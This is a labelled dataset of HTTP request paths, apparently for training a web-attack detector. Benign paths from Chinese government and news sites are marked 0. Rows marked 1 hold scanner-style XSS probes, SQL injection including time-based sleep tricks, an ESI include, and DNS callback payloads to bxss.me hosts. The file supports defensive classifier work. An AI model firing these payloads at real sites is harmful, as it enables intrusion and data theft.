request	label
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u6c5f\u6d9b\u8425\u517b\u65e9\u9910\u5e97	0
/**********/system/2020/05/25/013169262.shtml	0
/***/blockdata/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid°Ëtpage=&channelid=minsheng<alert(88952634)>	1
/zwxx_11337/****/201712/t20171207_627983.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0124\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/******/sbd/css/1.css	0
/************/account-opening-process/if(now()=sysdate(),sleep(6),0)-01-13/138.html	1
/***/0/01/91/75/1917596_738586.png	0
/**/co867p.html	0
/**********/system/2021/06/22/javascript:void(0);	1
"/****/bysw/202109/t20210918_186720.html?leader="""".gethostbyname(lc(""""hitqx"""".""""ejkuescoc60e5.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(67).chr(97).chr(72)."""""	1
"/http://*******/t/xss.html?	1
/**********/system/2018/10/18/012721331.shtml	0
/****/xxgkml/qtfdxx/zdjcyjzj/202106/p020210616377882676073.docx	0
"/****/xxgkzd/list.html?new=0.8921938434089278<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/**/system/2021/12/09/javascript:void(0);	1
"/xxgk'""""()&%<acx><script >dwaj(9746)</script>/*****/1079/1081/list.html"	1
"/***/getallchannels?vno=3.5.0""and/**/extractvalue(1,concat(char(126),md5(1080097157)))and"""	1
"/****/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/****/dqgz/ and 1>1	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u848b\u8363\u6c7d\u8f66\u4fee\u7406\u90e8	0
/***/interface/comul_total.json.jsp?callback=jquery1710037564234413995035_1639979919910	0
/****/zfwjn/1088/1093/list.html?new='.gethostbyname(lc('hitud'.'ezjnugap007eb.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(87).chr(98).chr(65).'	1
/*****/images/dbline.gif	0
"/****/czgk/bmjs/zzqfyxt/pyxrmfy/202108/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e00\u53f7\u5927\u76d8\u9e21\u9910\u5385	0
/****/zdqd.php	1
"/******/5/jquery.superslide.bxss.me/t/xss.html?	1
/***/interface/url_total_pv.json.jsp?callback=jquery19107427411212339969_1640025785500	0
/****/sj1/tjxx/202104/t20210423_2797450.html	0
"/****/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/***/0/01/75/47/1754781_904308.jpg	0
/************/interfaces/autocomplete.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=if(now()=sysdate(),sleep(15),0)&searchid=1&total=&tpl=16&websiteid=110105008056111	1
/**********/system/2021/10/01/013459656.shtml	0
/***/0/02/11/90/2119001_994674.jpg	0
/****/2020jnxc/yxzp/202006/t20200630_249610.html	0
/*******/ela0ak.php	1
/******/system/2016/08/27/012109284.shtml	0
/**********/system/2021/10/08/javascript:window.print()	1
"/****/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
"/***/2021/7/12/art"""" and 2*3*8=6*8 and """"h8qg""""=""""h8qg_35_234319.html"	1
/*******/gica.php	1
"/****/mtgz/2021_mtgz/202103/t20210316_271472.html"" and ""x""=""x"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9e3f\u8fd0\u5bb6\u7535\u5bb6\u653f\u670d\u52a1\u90e8	0
/****/zzxxgk/jjhzj/gyjzq/hnx_3667/202101/t20210128_177016.html	0
/zwxx_11337/****/201903/t20190311_1304751.html	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u8001\u5170\u996d\u5e84	0
/***/0/01/96/61/1966153_980877.jpg	0
/***/open?signature=f912843530cd01ef038c13b8f0369d841de6924a°¡tamp=1640035458&nonce=38660104&encrypt_type=aes&msg_signature=1e5b52d013ef34ce5c991a53460463496bb341e7	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=49095	0
/***/viewspace-172.html	0
/**************/newscenter/system/2021/12/20/013497031.shtml	0
/****/system/2021/12/08/javascript:window.print()	1
"/**/ui/widgets/hanweb/http://bxss.me/t/xss.html?	1
/************/template/jcse/110105008056111/16/images'||'/plugin/criteria/criteria.js	1
/zwxx_11337/****/202002/t20200207_1944672.html	0
"/**/ui/widgets/hanweb/placeholder/css"""" and 2*3*8=6*8 and """"ty5s""""=""""ty5s/placeholder.css"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(6291)"">?_=1630312283968"	1
/****/zt/msss/msxw/201908/t20190814_1660055.html	0
/****/bmkx/slyj/202101/t20210106_175684.html	0
/****/xqdt/byq/202111/w020211118351071834024.jpg	0
/****/byyw/202111/t20211126_196987_wap.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u4e07\u5fe0\u6469\u6258\u8f66\u4fee\u7406\u90e8	0
/*******/qiye/b-e773941.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 6376=6376 and ('1'='1	1
/******/resource'||'/js/vsb_news_search_entry.js	1
/**/index.php?do=post&id=412&c=dt&a=goods&	1
/zwxx_11337/****/202112/t20211215_3224330.html	0
/****/shzr/index_1.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u901f\u79d1\u7535\u5b50\u5546\u884c	0
/****/category/guowaishichangzhunru?page=1' or 6200=3898 /*	1
/******/2015qglh/lhhx/	0
/about-southwest/******/2020-12-16/2020-12-16.html	0
/******/system/2019/12/18/javascript:void(0);	1
/****/20201221/e112730196.html	0
/**/index.php?title=acunetixtest298178&action=submit	1
/****/wlzj/202103/t20210303_http://bxss.me/t/fit.txt?.jpg.html	1
"/**/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/****/system/2020/03/14/011940888.shtml	0
/****/dbgd/201412/w020150209568761446868.jpg	0
/****/\u02eb\ufffd\ufffd\u05ae\ufffd\ufffd	0
/****/zzxxgk/bmfgj/fggzdt/202103/t20210302_178032.html	0
/****/201909/t20190926_1757783.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5929\u8c79\u6c7d\u8f66\u8fd0\u8f93\u6709\u9650\u8d23\u4efb\u516c\u53f8\u6c38\u5b81\u52a0\u6cb9\u7ad9	0
/***/003/003/508/00300350864_c0ed4710.jpg	0
"/******/_content/download.jsp?urltype=news.downloadattachurl') and 1444=1444 	1
/wp-content/*******/login-wall-rzrsf/login_wall.php?login=cmd	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u4e2b\u4e2b\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u660c\u8fbe\u5546\u884c	0
/**********/system/2021/12/17/013496200.shtml	0
/****/tzgg/2019_tzgg/202008/t20200819_252138.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7396\u96f6\u745e\u5a1c\u7f8e\u53d1\u5e97	0
/****/tzgg/202109/t20210928_3060287_zzb.html	0
/******/public/2021/12/02/20211202_17d793b41ca_r1_1200k.mp4	0
/*****/hbnx/envilo.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u661f\u8fb0\u6c7d\u8f66\u7535\u5b50\u7535\u5668\u5e97	0
/****/zzxxgk/tjj/tjjysqgk/gkcx/list.html?new='.gethostbyname(lc('hitlg'.'aiegazpf01beb.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(72).chr(110).chr(75).'	1
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwbgt	0
/****/jtdt/2012jtdt/index_4.html	0
/****/zgsdt/zgs16/201612/t20161216_108631.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9526\u6da6\u6cfd\u84dd\u8393\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5723\u5730\u4e9a\u6b4c\u9152\u5427	0
/****/system/2016/10/27/012171967.shtml	0
/****/qzfwj/201801/t20180115_668740.html	0
/****/mtgz'||'/2021_mtgz/202107/t20210712_310551.html	1
/****/yqfkgszxd/fykp/javascript:void(0);	1
/**********/system/2021/12/03/013489268.shtml	0
/****/bmkx/sgsj/201902/t20190226_114786_wap.html	0
/******/zz-common.css	0
/****/zfwjn/'.gethostbyname(lc('hitod'.'avhouicb37e80.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(115).chr(68).chr(108).chr(70).'/1110/list.html	1
/****/jrnx.htm	1
/**********/system/2021/10/04/013460376.shtml	0
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/****/system/2018/09/14/012700097.shtml	0
/******/system/2015/03/03/011649879.shtml	0
/****************/notification/negotiate?access_token=a9d4b18e-459d-49cf-a92e-12775cecb758	0
/***/wxzcgk/201901/t20190110_1247135.html	0
/**********/system/2020/05/26/013170856.shtml	0
/*******/qiye/b-e2252624.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u56fd\u534e\u517b\u6b96\u573a	0
/***/miandg/index.php	1
/****/zycwxx/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/******/system/2010/09/27/010204926.shtml	0
/***/viewspace-894.html	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(874)</script>?_=1630311628929"	1
/****/zhengce/zfwjn/202104/p020210421603836298227.docx	0
/**********/system/2021/11/04/013475385.shtml	0
/****/wxj/spbd	0
/**********/system/2020/03/28/013127217.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5c0f\u5f20\u732a\u8089\u5e97	0
/****/20201204/e111566338.html	0
/****/category/siluyiliao	1
/**********/system/2015/12/22/011894664.shtml	0
/zwxx_11337/****/zzlist_4.html	0
/**/index.php?do=post&id=287&c=dt&a=goods&	1
/****/bmkx/sjcy/201910/t20191014_143067.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7b1b\u68b5\u7f8e\u53d1\u5de5\u4f5c\u5ba4	0
/*/script	1
/****/b-e1095672.html	0
/**********/system/2020/06/07/013179683.shtml	0
/**********/system/more/237000000000000/0006/237000000000000_00000653.shtml	0
/******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202010/t20201022_173283.html	0
/****/qzfwj/201801/t20180115_668905.html	0
/******/system/2020/08/22/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5170\u745e\u7efc\u5408\u95e8\u5e02\u90e8	0
/***/col33/index.html?uid=19791&pagenum=1	0
/****/mtgz/2021_mtgz%' and 2*3*8=6*8 and 'r6zj'!='r6zj%/202103/t20210314_271326.html	1
/**/system/2021/01/21/javascript:void(0);	1
"/******/resource/js/jquery/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.js"	1
"/**/ui/widgets/validity"""" and 2*3*8=6*8 and """"ldkp""""=""""ldkp/validity.js"	1
/******/system/2019/08/12/012948474.shtml	0
/zwxx_11337/****/202107/t20210723_2939823_zzb.html	0
"/******/system/2021/06/09'""""/><img src=javascript:alert(2432)>/013399706.shtml"	1
/zwxx_11337/****/202007/t20200722_2170067.html	0
"/*****/system/2021/01/21/013323672.shtml/""><script>alert(128)</script>"	1
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/201602/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u897f\u5b89\u9547\u70df\u9152\u767e\u8d27\u5546\u5e97	0
/***/tips/tipsloginsubmit.action	1
/****/zzxxgk/wsjkwyh/javascript:void(0)	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u51ef\u805a\u76db\u7164\u4e1a\u6709\u9650\u516c\u53f8	0
/**/system/2008/03/17/002450127.shtml	0
/************/action/to/init/1472809582362382336	0
/****/gccb/nygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/****/files.php?folder="""">alert(777)"	1
/**********/system/2020/08/27/013234785.shtml	0
/**/system/2020/12/23/012106972.shtml	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/*******/zwgk/czgk/bmyjs/rmtt/tw/	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7f51\u7ea6\u8f66	0
"/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/**********/system/2020/06/07/013179601.shtml	0
/***********/resourceslist.html?s=zs;select sleep(5)	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u805a\u5174\u88c5\u9970\u6750\u6599\u5e97	0
"/art'""""()&%<acx><script >ierk(9255)</script>/****/10/11/art_34_242320.html"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5976\u79bd\u6e14\u4e1a\u516c\u53f8\u6e05\u771f\u996e\u6599\u5382	0
/******/qgbzdh/images/3-1.gif	0
"/******/zlhz/""><script>alert(197)</script>"	1
/**********/system/2021/06/11/013400816.shtml	0
/****/b-e592889.html	0
/****/xxgkml/qtfdxx/zdjcyjzj/202110/local	0
/**/index.php?title=acunetixtest3336a5&action=submit	1
/***/0/01/76/25/1762534_999953.jpg	0
/****/bmkx/jyj/201610/t20161025_9621.html	0
/****/xh/hd/201905/w020190507806072919476.jpg	0
"/****/zfcwhy/202107/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(67).concat(106).concat(89) (require""""socket""""
socket.gethostbyname(""""hitox"""" """"hqlfkzjk48722.bxss.me."""")[3].to_s) """"_2938511.html"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5609\u5174\u6c7d\u914d\u90e8	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/201802/w020180211350980271857.gif	0
/****/jtdt/2020_jtyw/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/***/mobile_h5/waparticledetail.do?article_id=202102092048061128&contenttype=article	0
/****/202011/t20201125_256667.html	0
"/****/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/zwxx_11337/****/202006/t20200616_2138412.html	0
/****/xqldly/hfjyxz/202007	0
/*******/..	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5feb\u6377\u5e72\u6d17\u5e97	0
/*******/qiye/b-e2042892.html	0
/****/zfcwhy/202107/t20210723_http://bxss.me/t/fit.txt?.jpg.html	1
/****/bmkx/ggjyzx/	0
/********/fortunewheel/view/index.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5927\u6e2f	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u66b4\u96e8	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u8001\u59e8\u5b37\u997a\u5b50\u9986	0
"/***/2021/8/18/art_46_237432.html/<img src=""javascript:alert(6757)"">"	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqlshwzcbj/zzqlsj/201702/t20170210_318569.html	0
/****/bmkx/sgsj/201912/t20191204_145166.html	0
/****/zjdt/czjs/gzdt/command/cmd	1
/************//xfs.bxss.me/jcse/110105008056111/16/images/plugin/hotnews/js.js	1
/***/blockdata/getsearchinfo.do?&title=\u6253\u64e6	0
/****/qyzdsx/\u83ef\u6f64\u6c34\u6ce5_files/crc_log2_cn.png	0
/******/usercenter/index?qrcode=90666&code=07109tfa19m4kc0p03ia19oa0e309tf5	0
/******/resource/js'||'/image/imagescroll.js	1
/***/blockdata/getsearchinfo.do?&title=.*\u590f\u81f3\u672a\u81f3\uff1a.*	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zjdt/gzdt/1.htm	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6d2a\u6da6\u8282\u6c34\u6750\u6599\u90e8	0
/****/xh/hy/202104/t20210430_2807659.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(450)"">?_=1630311410238"	1
/***/col3910/index.html	0
/****/20211027/10643.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u5e74\u5e74\u5927\u4e30\u6536\u997c\u5b50\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e3d\u51cf\u7f8e\u7f8e\u5bb9\u7d2b\u56ed\u5e97	0
/****/whhd/201412/t20141218_47995.html	0
/*****/general/diary/new/submit.php	1
/**/product/dxzzj/201808/t20180820_194604.html	0
/**/images/logo.png	0
/***/rlzy/rcgk/bqsm/lxwm/nbfw/gjcp/gcjx/bqsm/gjcp/fzjx/gygj/gjgk/fzlc/	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5e38\u5f80\u6c7d\u8f66\u914d\u4ef6\u9500\u552e\u90e8	0
/****/20210111/e114118927.html	0
/***/0/02/03/29/2032922_860036.jpg	0
/**********/system/2020/06/26/013193252.shtml	0
/***/0/01/26/02/1260275_999669.jpg	0
/****/qyzz/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmyjs/zzqjcyxt/zzqgjzzqtljcy_1818/201712/t20171211_633766.html	0
/****/js/chunk-7d15097e.b2492d64.js	0
/**********/system/2020/05/11/013159186.shtml	0
/***/0/02/12/31/2123198_963493.png	0
"/**/hero_os/search?q="""" onmouseover=alert(777) ="""""	1
/**********/system/2021/12/17/013495986.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery17106271063648661788_1639980127897	0
/****/zjdt/ghby/gzdt%' and 2*3*8=6*8 and 'fdm6'!='fdm6%/1.htm	1
/******/nxrq_priv_icon1cur_4.png	0
/***********/shangpinqihuo/nongchanpin/javascript:void(0)	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u8001\u4faf\u5546\u5e97	0
/****/web/css/zmhd.css	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201809	0
/**********/system/2021/08/26/013440428.shtml	0
/****/xydt/2015_hydt/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/*******/qiye/b-e2068660.html	0
/****/20200602/e101744192.html	0
/******/usercenter/index?qrcode=scanqrcode&code=051zqpga1gemlc0qezga1ldu080zqpgg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery1111016318357634707725_1640025525139	0
/**/ui/widgets'||'/hanweb/validity/validity.js	1
/****/czgk/bmjs/gdyx/zzqjxy/201908/	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5473\u591a\u591a\u9ebb\u8fa3\u70eb\u51c9\u76ae\u5e97	0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/hanweb.css	1
"/*/210719/bxss.me/t/xss.html?	1
/****/gccb/qgzfgc	0
/**********/system/2020/05/18/013164414.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/202008/t20200817_2188568.html	0
/****/index.php?vyhl='>alert(777)&lang=cze	1
/*******/202112/202112201646161100.html	0
"/****/gjzqq/index.html?continent=%' or 8889=8362 	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01bd\ufffd\ufffd&l=\ufffd\u0134\ufffd	0
/***********/wechatlist.aspx?page=5);select sleep(5)	1
/*******/qiye/b-e2295975.html	0
/****/web/search?channelid=299868&perpage=1000%') or 5218=5218 and '%'='	1
/***********/shangpinqihuo/nengyuanhuagong/index.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7f8a\u7ba1\u5bb6\u9972\u6599\u7ecf\u9500\u90e8	0
/***/0/02/03/90/2039049_140549.jpg	0
/****/ypj/yw/202112/t20211216_3227374.html	0
/****/201909/t20190926_1757384.html	0
/******/download/downfile.jsp?classid=0&filename=e70d33e0d82f4e099c1d51b5eea1c656.doc	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 0641=0641 and '%%'='%	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm	1
/****/whs/yw_1286/202111/t20211130_3172184.html	0
/**********/system/2020/05/28/013172860.shtml	0
/zwxx_11337/***/202006/t20200617_2139527.html	0
